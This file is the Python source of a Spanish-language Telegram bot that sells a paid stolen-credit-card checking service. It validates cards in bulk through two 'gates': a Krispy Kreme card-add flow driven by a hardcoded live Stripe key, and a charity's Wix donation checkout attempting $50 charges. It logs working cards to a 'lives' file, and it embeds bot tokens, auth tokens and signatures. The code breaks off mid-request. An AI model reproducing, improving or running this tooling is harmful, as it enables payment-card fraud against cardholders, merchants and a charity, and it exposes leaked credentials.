#!/usr/bin/env python3
from datetime import datetime
import io
import json
import os
from pathlib import Path
import queue
import random
import re
import sys
import threading
import time
from typing import List
import uuid
import requests
from telebot import apihelper, TeleBot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# Activar reintentos automáticos en fallas de red de Telegram
apihelper.RETRY_ON_ERROR = True

# Detectar ruta (Railway o Local)
if getattr(sys, "frozen", False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(__file__)

# =========================================================
# CONFIGURACIÓN DESDE VARIABLES DE ENTORNO (RAILWAY)
# =========================================================
TOKEN = os.getenv("TOKEN", "8531578967:AAEZykF8G26VsWB2C27h-ign6P3X7-Xrx0s")
PROPIETARIO_ID_ENV = os.getenv("PROPIETARIO_ID", "5504611412")
try:
    PROPIETARIO_ID = int(PROPIETARIO_ID_ENV)
except ValueError:
    PROPIETARIO_ID = 5504611412

bot = TeleBot(TOKEN)

# Estado global del bot
estado = {
    "en_progreso": False,
    "detener": False,
    "total": 0,
    "procesados": 0,
    "exitosos": 0,
    "fallidos": 0,
    "lista_exitos": [],
    "lista_fallos": [],
    "usuario_actual": "Anónimo",
    "chat_id_actual": None,
    "user_id_actual": None,
    "gate_activo": "Krispy Kreme"
}
estado_lock = threading.Lock()
cola_tareas = queue.Queue()
usuarios_espera_alerta = set()
espera_lock = threading.Lock()

# Contadores globales
contador_fail = 0
contador_success = 0
contador_expiradas = 0

# =========================================================
# RUTAS PERSISTENTES (VOLUMEN DE RAILWAY)
# =========================================================
DATA_DIR = os.path.join(BASE_DIR, "data") if os.path.exists(os.path.join(BASE_DIR, "data")) else BASE_DIR
os.makedirs(DATA_DIR, exist_ok=True)

ARCHIVO_CLIENTES = os.path.join(DATA_DIR, "clientes.txt")
LIVES_FILE = os.path.join(DATA_DIR, "lives.txt")
FAIL_FILE = os.path.join(DATA_DIR, "fail.txt")

creditos_lock = threading.Lock()

COSTO_SUCCESS = 4
COSTO_FAIL = 0
CREDITOS_INICIALES = 40  # 🎁 Créditos gratis para nuevos usuarios

# URLs de los endpoints para el Gate de Ecopil / Wix
URL_TOKENIZE = "https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens"
URL_PAYMENT_DETAILS = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
URL_CARTS = "https://www.ecopil.org/_api/cart-v2/v2/carts"
URL_ACCESS_TOKENS = "https://www.ecopil.org/_api/v1/access-tokens"
URL_RANDOM_USER = "https://randomuser.me/api/?nat=es"

# Tokens fijos globales para Wix
AUTH_TOKEN = "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0"
COMMON_CONFIG = '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%221cf36fba-ad22-4b5e-a3db-1591b3aee565%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D'


def notificar_propietario(mensaje):
    """Envía un mensaje de log/reporte al propietario."""
    try:
        bot.send_message(PROPIETARIO_ID, mensaje, parse_mode="HTML")
    except Exception as e:
        print(f"Error al notificar al propietario: {e}")


def cargar_clientes():
    clientes = {}
    if not os.path.exists(ARCHIVO_CLIENTES):
        return clientes
    with open(ARCHIVO_CLIENTES, "r", encoding="utf-8") as f:
        for linea in f:
            linea = linea.strip()
            if not linea or linea.startswith("#"):
                continue
            partes = [p.strip() for p in linea.split(",")]
            if len(partes) >= 3:
                uid, uname, creds = partes[:3]
                try:
                    clientes[uid] = {"username": uname, "creditos": int(creds)}
                except ValueError:
                    pass
    return clientes


def guardar_clientes(clientes):
    with open(ARCHIVO_CLIENTES, "w", encoding="utf-8") as f:
        for uid, data in clientes.items():
            f.write(f"{uid},{data['username']},{data['creditos']}\n")


def obtener_saldo(user_id):
    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        if user_str in clientes:
            return clientes[user_str]["creditos"]
        return None


def registrar_usuario(user_id, username):
    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        clean_uname = (username or "anonimo").lstrip("@")
        
        if user_str in clientes:
            if clientes[user_str]["username"] != clean_uname:
                clientes[user_str]["username"] = clean_uname
                guardar_clientes(clientes)
            return False, clientes[user_str]["creditos"]
        
        clientes[user_str] = {"username": clean_uname, "creditos": CREDITOS_INICIALES}
        guardar_clientes(clientes)

        notificar_propietario(
            f"👤 <b>NUEVO REGISTRO EN EL BOT (+40 CRÉDITOS)</b>\n"
            f"• <b>Usuario:</b> @{clean_uname}\n"
            f"• <b>ID:</b> <code>{user_id}</code>\n"
            f"• <b>Bono otorgado:</b> 40 créditos gratis"
        )
        return True, CREDITOS_INICIALES


def modificar_creditos_por_identificador(identificador, cantidad):
    with creditos_lock:
        clientes = cargar_clientes()
        id_buscado = str(identificador).strip().lstrip("@")
        
        user_key = None
        if id_buscado in clientes:
            user_key = id_buscado
        else:
            for uid, data in clientes.items():
                if data["username"].lower() == id_buscado.lower():
                    user_key = uid
                    break
        
        if not user_key:
            return False, "Usuario no encontrado en la base de datos."
        
        clientes[user_key]["creditos"] += cantidad
        if clientes[user_key]["creditos"] < 0:
            clientes[user_key]["creditos"] = 0
            
        nuevo_saldo = clientes[user_key]["creditos"]
        guardar_clientes(clientes)
        return True, (user_key, clientes[user_key]["username"], nuevo_saldo)


def cobrar_creditos_por_resultado(user_id, es_exito):
    costo = COSTO_SUCCESS if es_exito else COSTO_FAIL
    if costo == 0:
        return obtener_saldo(user_id) or 0, 0

    with creditos_lock:
        clientes = cargar_clientes()
        user_str = str(user_id)
        if user_str in clientes:
            clientes[user_str]["creditos"] = max(
                0, clientes[user_str]["creditos"] - costo
            )
            nuevo_saldo = clientes[user_str]["creditos"]
            guardar_clientes(clientes)
            return nuevo_saldo, costo
        return 0, costo


def validar_tarjeta(cc, mes, anio, cvv):
    if not (cc.isdigit() and len(cc) in [15, 16]):
        return False, "FORMATO_INVALIDO_CC"
    if not (mes.isdigit() and 1 <= int(mes) <= 12):
        return False, "FORMATO_INVALIDO_MES"
    if len(anio) == 2:
        anio_4 = f"20{anio}"
    elif len(anio) == 4:
        anio_4 = anio
    else:
        return False, "FORMATO_INVALIDO_ANIO"
    if not (cvv.isdigit() and len(cvv) in [3, 4]):
        return False, "FORMATO_INVALIDO_CVV"

    ahora = datetime.now()
    anio_int = int(anio_4)
    mes_int = int(mes)

    if anio_int < ahora.year or (anio_int == ahora.year and mes_int < ahora.month):
        return False, "EXPIRADA"

    return True, anio_4


def notificar_usuarios_en_espera():
    with espera_lock:
        if not usuarios_espera_alerta:
            return
        for u_id in list(usuarios_espera_alerta):
            try:
                bot.send_message(
                    u_id, 
                    "🔔 <b>¡El sistema ya está libre!</b> Ya puedes enviar tu nuevo lote de tarjetas.", 
                    parse_mode="HTML"
                )
            except Exception:
                pass
        usuarios_espera_alerta.clear()


def obtener_menu_principal():
    markup = InlineKeyboardMarkup()
    btn_check = InlineKeyboardButton("⚡ SELECCIONAR GATE / CHECK", callback_data="btn_elegir_gate")
    btn_saldo = InlineKeyboardButton("💰 Mis Créditos", callback_data="btn_saldo")
    btn_instrucciones = InlineKeyboardButton("📖 Instrucciones", callback_data="btn_instrucciones")
    btn_formato = InlineKeyboardButton("📌 Formato Correcto", url="https://t.me/filtro_carbon_bot")
    btn_comprar = InlineKeyboardButton("🛒 Comprar", url="https://t.me/Juanper33z")
    btn_grupo = InlineKeyboardButton("📢 Mi Grupo", url="https://t.me/+kIN_CgyaWP5lZDUx")

    markup.row(btn_check, btn_saldo)
    markup.row(btn_instrucciones, btn_formato)
    markup.row(btn_comprar, btn_grupo)
    return markup


def generar_resumen_proceso(user_id=None):
    saldo_actual = obtener_saldo(user_id) if user_id else "N/A"
    resumen = (
        "📊 <b>RESUMEN DEL PROCESO</b>\n"
        "─────────────────────────\n"
        f"<b>Gate utilizado:</b> {estado['gate_activo']}\n"
        f"<b>Total procesadas:</b> {estado['procesados']}/{estado['total']}\n"
        f"✅ <b>SUCCESS:</b> {estado['exitosos']}\n"
        f"❌ <b>FAIL:</b> {estado['fallidos']}\n"
        f"⏳ <b>EXPIRADAS:</b> {contador_expiradas}\n"
        "─────────────────────────\n"
        f"💰 <b>Saldo actual:</b> {saldo_actual} créditos\n"
    )
    return resumen


def generar_informe_propietario():
    saldo_usuario = obtener_saldo(estado["user_id_actual"]) if estado["user_id_actual"] else "N/A"
    
    informe = f"🏁 <b>REPORTES Y RESULTADOS DE LOTE</b>\n"
    informe += f"🚪 <b>Gate:</b> {estado['gate_activo']}\n"
    informe += f"👤 <b>Usuario:</b> @{estado['usuario_actual']} (<code>{estado['user_id_actual']}</code>)\n"
    informe += f"💰 <b>Saldo restante:</b> {saldo_usuario} cr.\n"
    informe += f"📊 <b>Totales:</b> {estado['procesados']}/{estado['total']} (✅ {estado['exitosos']} | ❌ {estado['fallidos']})\n\n"

    informe += "🟢 <b>ÉXITOS (LIVES):</b>\n"
    if estado["lista_exitos"]:
        for item in estado["lista_exitos"]:
            informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
    else:
        informe += "<i>Ninguna tarjeta aprobada.</i>\n"

    informe += "\n🔴 <b>FALLOS (FAILS):</b>\n"
    if estado["lista_fallos"]:
        for item in estado["lista_fallos"][:25]:
            informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
    else:
        informe += "<i>Sin fallos registrados.</i>\n"

    return informe


def mostrar_selector_gates(chat_id, user_id):
    saldo = obtener_saldo(user_id)
    if saldo is None:
        bot.send_message(chat_id, "❌ No estás registrado. Escribe /start primero.")
        return

    if saldo < COSTO_SUCCESS:
        bot.send_message(
            chat_id,
            f"⛔ <b>Saldo insuficiente:</b> Tienes <b>{saldo} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b>.",
            parse_mode="HTML",
        )
        return

    with estado_lock:
        if estado["en_progreso"]:
            markup_aviso = InlineKeyboardMarkup()
            markup_aviso.add(InlineKeyboardButton("🔔 Avisarme cuando esté libre", callback_data="btn_avisar"))
            bot.send_message(
                chat_id,
                "⚠️ Ya hay un proceso en ejecución. ¿Deseas que te avise en cuanto quede desocupado?",
                reply_markup=markup_aviso,
            )
            return

    markup = InlineKeyboardMarkup()
    btn_krispy = InlineKeyboardButton("🍩 Gate 1: Krispy Kreme (Stripe API)", callback_data="gate_krispy")
    btn_wix = InlineKeyboardButton("💳 Gate 2: Stripe Wix Charger ($50 - Ecopil)", callback_data="gate_wix")
    markup.row(btn_krispy)
    markup.row(btn_wix)

    bot.send_message(
        chat_id,
        "🎛️ <b>SELECCIONA LA PASARELA (GATE) A UTILIZAR:</b>\n"
        f"💰 <i>Tu saldo actual: {saldo} créditos (Costo: {COSTO_SUCCESS} por éxito)</i>",
        parse_mode="HTML",
        reply_markup=markup
    )


def solicitar_datos_ccs(chat_id, user_id):
    msg = bot.send_message(
        chat_id,
        f"📋 <b>Gate Activo:</b> {estado['gate_activo']}\n\n"
        "Envía tus tarjetas en formato <code>CC|MM|AAAA|CVV</code> o sube un archivo <code>.txt</code>:\n"
        "<i>(Si tu lista está desordenada, puedes formatearla con @filtro_carbon_bot)</i>",
        parse_mode="HTML",
    )
    bot.register_next_step_handler(msg, recibir_datos_lote)


# =========================================================
# GATE 1: KRISPY KREME
# =========================================================
def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
    try:
        cc_partes = linea_cc.split("|")
        cc = cc_partes[0]
        mm = cc_partes[1]
        yyyy = cc_partes[2]
        cvv = cc_partes[3]
    except IndexError:
        return False, "Formato incorrecto en la línea de tarjeta"

    ultimos_4 = cc[-4:]
    timestamp_str = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")

    signature = "536d78c71f0010d53a48beb0d6935c47"
    credential_pwd = (
        "JN84D5Gvhn946voUKVivpiPKZKjpvK0qPSVo/A285gNDM+OuHRnV/+"
        "HyiRIQGmy67lleTpPG7M35VJe15FLrZA=="
    )

    session = requests.Session()

    stripe_url = "https://api.stripe.com/v1/tokens"
    stripe_headers = {
        "Host": "api.stripe.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Stripe-Version": "2020-08-27",
        "User-Agent": "KrispyKreme/1 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
        "Authorization": "Bearer pk_live_51OjVj8FXiwuOsp7TTDvOZMPwEf81Jf8vmLt0pj9Mip3RcjHQIMyV4FIV9UKdIKY9WBY0GiFd1Oo2NY4Dpd0L3VrR00XBj375RZ",
    }
    stripe_payload = f"card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[name]=Juan%20Perez&card[number]={cc}&payment_user_agent=stripe-ios/24.14.0%3B%20variant.payments-ui%3B%20STPPaymentCardTextField"

    try:
        resp_stripe = session.post(stripe_url, headers=stripe_headers, data=stripe_payload, timeout=15)
        stripe_json = resp_stripe.json()
        card_token_id = stripe_json.get("id")
        if not card_token_id:
            error_msg = stripe_json.get("error", {}).get("message", "Error al generar token en Stripe")
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {error_msg}\n")
            return False, error_msg
    except Exception as e:
        err_msg = f"Excepción en Stripe: {e}"
        with open(FAIL_FILE, "a", encoding="utf-8") as f:
            f.write(f"{linea_cc} | {err_msg}\n")
        return False, err_msg

    krispy_url = "https://krispykreme.adomicil.io/Payment/Card/Add"
    krispy_payload = {
        "Data": {
            "Card": {
                "CardIsCredit": True,
                "CardExpirationYear": yyyy,
                "DeviceId": card_token_id,
                "CardLast4": ultimos_4,
                "CardExpirationMonth": mm,
                "CardPhone": "2481709250",
                "CardEmail": correo or "test@gmail.com",
                "CardToken": card_token_id,
                "CardBankName": "Jpmorgan Chase Bank N.A.",
                "CardBrand": "visa",
                "CardHolderName": "Juan Perez",
                "Cardcvv": cvv,
            }
        },
        "Auth": {
            "CredentialPlatform": "mail",
            "Signature": signature,
            "CredentialData": correo or "test@gmail.com",
            "CredentialPwd": credential_pwd,
            "Timestamp": timestamp_str,
            "CredentialLogin": correo or "test@gmail.com",
        },
    }
    krispy_headers = {
        "Host": "krispykreme.adomicil.io",
        "Content-Type": "application/json; charset=UTF-8",
        "x-language": "es",
        "User-Agent": "KrispyKreme/1 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
    }

    try:
        resp_krispy = session.post(krispy_url, headers=krispy_headers, json=krispy_payload, timeout=15)
        krispy_json = resp_krispy.json()
        response_data = krispy_json.get("Response", {})
        return_code = response_data.get("ReturnCode", 500)
        return_message = response_data.get("ReturnMessage", "Desconocido")

        if return_code == 200 or "exito" in return_message.lower():
            with open(LIVES_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {return_message}\n")
            return True, return_message
        else:
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {return_message}\n")
            return False, return_message

    except Exception as e:
        err_msg = f"Error en Krispy Kreme: {e}"
        with open(FAIL_FILE, "a", encoding="utf-8") as f:
            f.write(f"{linea_cc} | {err_msg}\n")
        return False, err_msg


# =========================================================
# GATE 2: STRIPE WIX CHARGER ($50 - ECOPIL) (Lógica exacta y completa)
# =========================================================
def procesar_tarjeta_wix(linea_cc):
    session = requests.Session()
    try:
        partes = linea_cc.strip().split("|")
        if len(partes) < 4:
            return False, "Formato incorrecto"

        cc_number = partes[0].strip()
        mes_str = partes[1].strip()
        cc_yyyy = int(partes[2].strip())
        cc_cvv = partes[3].strip()
        cc_mm = int(mes_str)

        # 0. Obtener Visitor ID y Nombre Aleatorio
        idd2 = str(uuid.uuid4())
        try:
            resp_visitor = session.get(
                f"{URL_ACCESS_TOKENS}?cacheBust={idd2}",
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                },
            )
            visitorId2 = resp_visitor.json().get("visitorId", idd2)
        except Exception:
            visitorId2 = idd2

        try:
            resp_name = session.get(
                URL_RANDOM_USER,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                },
            )
            name_data = resp_name.json()["results"][0]["name"]
            holder_name = f"{name_data['first']} {name_data['last']}"
        except Exception:
            holder_name = "esgar lopez"

        # 1. Tokenización (Token CC)
        headers_tokenize = {
            "Host": "cashier-pci.wixapps.net",
            "Content-Length": "166",
            "X-Wix-Brand": "wix",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Authorization": AUTH_TOKEN,
            "Accept-Language": "es-419,es;q=0.9",
            "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Commonconfig": COMMON_CONFIG,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://cashier-pci.wixapps.net",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": f"https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.ecopil.org&msid=390faaee-dafd-48eb-a4bc-38baeef05eb0&visitorId={visitorId2}&siteOwnerId=0a044b16-e087-4261-a5d3-460a61680769",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=1, i",
            "Connection": "keep-alive",
        }

        payload_tokenize = {
            "cvv": cc_cvv,
            "creditCard": {
                "number": cc_number,
                "expiration": {"month": cc_mm, "year": cc_yyyy},
                "additionalInformation": {"holderName": holder_name},
                "billingAddress": {},
            },
        }

        resp = session.post(URL_TOKENIZE, headers=headers_tokenize, json=payload_tokenize)
        
        if '{"message":"Unexpected Payments exception","details":{}}' in resp.text or '{"message":"Could not parse JSON","details":{}}' in resp.text:
            msg_err = "Error personalizado (Custom Keycheck)"
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {msg_err}\n")
            return False, msg_err

        try:
            token = resp.json()["token"]["token"]
        except Exception:
            err_msg = f"Tokenización fallida: {resp.text[:100]}"
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {err_msg}\n")
            return False, err_msg

        # 2. Payment Details (Token V2)
        headers_v2 = {
            "Host": "www.ecopil.org",
            "Content-Length": "443",
            "X-Wix-Brand": "wix",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Authorization": AUTH_TOKEN,
            "X-Xsrf-Token": "1793833731|QmlkzedBUzmf",
            "Accept-Language": "es-419,es;q=0.9",
            "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Commonconfig": COMMON_CONFIG,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.ecopil.org",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.ecopil.org/checkout?checkoutId=170d320a-f56a-4d96-9bc8-d61af1eb9aba&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%2526campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true",
            "Accept-Encoding": "gzip, deflate, br",
            "Priority": "u=1, i",
        }

        payload_v2 = {
            "details": {
                "paymentMethod": "creditCard",
                "billingAddress": {},
                "redirectTarget": "EMBEDDED",
                "installments": 1,
                "card": {
                    "numberToken": token,
                    "securityCodeToken": token,
                    "holderName": holder_name,
                    "expiryMonth": cc_mm,
                    "expiryYear": cc_yyyy,
                },
                "buyerInfo": {
                    "buyerId": visitorId2,
                    "buyerLanguage": "es",
                },
                "clientInfo": {
                    "deviceFingerprint": "b4adb5adddaf4012663d4eb24d1b48b0"
                },
            }
        }

        resp = session.post(URL_PAYMENT_DETAILS, headers=headers_v2, json=payload_v2)
        try:
            details_id = resp.json()["detailsId"]
        except Exception:
            err_msg = f"Error en Payment Details: {resp.text[:100]}"
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {err_msg}\n")
            return False, err_msg

        # 3. Crear Carrito Nuevo (Cart Token)
        headers_cart = {
            "Host": "www.ecopil.org",
            "Content-Length": "309",
            "X-Wix-Brand": "wix",
            "Authorization": "123OCk2g0S7I1_FxdtAtT4koSXTbgEzOKzBloI1XOS8.eyJpbnN0YW5jZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwiYXBwRGVmSWQiOiIyMmJlZjM0NS0zYzViLTRjMTgtYjc4Mi03NGQ0MDg1MTEyZmYiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA1VDAwOjA0OjIxLjA5NFoiLCJkZW1vTW9kZSI6ZmFsc2UsImFpZCI6ImYxODViZjhkLWZmMzQtNGYxYi1iMGVmLTVlMDM1MTgwZTU1ZiIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIiwic3MiOmZhbHNlfQ",
            "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%224d432572-9526-4dab-b1e7-b4f017dd0b50%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "X-Wix-Linguist": "es|es-mx|true|390faaee-dafd-48eb-a4bc-38baeef05eb0",
            "Content-Type": "application/json",
            "Origin": "https://www.ecopil.org",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.395ab825.bundle.min.js",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "es-419,es;q=0.9",
            "Priority": "u=1, i",
        }

        payload_cart = {
            "cart": {
                "settings": {"lockGiftCard": True, "lockCouponCode": True},
                "source": {"channelType": "OTHER_PLATFORM"},
            },
            "catalogItems": [{
                "catalogReference": {
                    "appId": "333b456e-dd48-4d6b-b32b-9fd48d74e163",
                    "catalogItemId": "2c882aa1-c6c2-4e62-b524-c300209c357f",
                    "options": {"amount": 50, "frequency": "ONE_TIME"},
                },
                "quantity": 1,
            }],
        }

        resp = session.post(URL_CARTS, headers=headers_cart, json=payload_cart)
        try:
            carro_tok = resp.json()["cart"]["id"]
        except Exception:
            err_msg = f"Error al crear carrito: {resp.text[:100]}"
            with open(FAIL_FILE, "a", encoding="utf-8") as f:
                f.write(f"{linea_cc} | {err_msg}\n")
            return False, err_msg

        # 4. Place Order (Testear CC)
        url_place_order = f"https://www.ecopil.org/_api/cart-v2/v2/carts/{carro_tok}/place-order"
        headers_place_order = {
            "Host": "www.ecopil.org",
            "X-Time-Budget": "30000",
            "X-Wix-Bi-Gateway": "environment=js-sdk,package-name=@wix/auto_sdk_ecom_cart-v-2,method-fqn=wix.ecom.cart.v2.CartService.PlaceOrder,entity=wix.ecom.v2.cart",
            "Authorization": AUTH_TOKEN,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36",
            "X-Wix-Linguist": "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.ecopil.org",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.1db1888f.bundle.min.js",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "es-419,es;q=0.9",
            "Priority": "u=1, i",
        }

        payload_place_order = {
            "cartId": carro_tok,
            "priceVerificationToken": "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRvdGFsXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJ0b3RhbEFmdGVyR2lmdENhcmRzXCI6e1wiYW1vdW50XCI6XCI1MC4wMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCI1MC4wMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJwYXlOb3dcIjp7XCJhbW91bnRcIjpcIjUwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwLjAwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInBheUxhdGVyXCI6e1wiYW1vdW50XCI6XCIwLjAwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjAuMDBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19fSIsImlhdCI6MTc5MzgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs",
            "paymentToken": details_id,
            "redirectUrls": {
                "errorUrl": f"https://www.ecopil.org/checkout?checkoutId={carro_tok}&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%26campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true&redirect=error",
